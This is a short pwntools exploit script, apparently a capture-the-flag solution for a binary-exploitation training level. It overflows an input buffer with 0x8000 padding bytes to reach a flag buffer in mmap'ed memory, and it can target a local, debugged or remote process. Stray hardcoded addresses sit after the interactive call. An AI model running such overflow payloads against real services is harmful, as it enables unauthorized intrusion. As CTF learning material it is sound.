from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']

# SOLUTION
# similar to level 10, but the location of flag buffer is far from the input buffer
# to get the offset you just need to calculate how many mmap'ed bytes between them using ghidra
# Please note that before the flag is mmap, there is one mmap statement that comes before the flag buffer, this is not
# calculated into the final offset

io = start()

# payload = flat([])
payload_size = 0x8000
io.sendlineafter(b'size: ', str(payload_size).encode())
io.send(b"a"*0x8000)

io.interactive()
start = 0x7ffebd433bc0
flag = 0x7ffebd433c12      
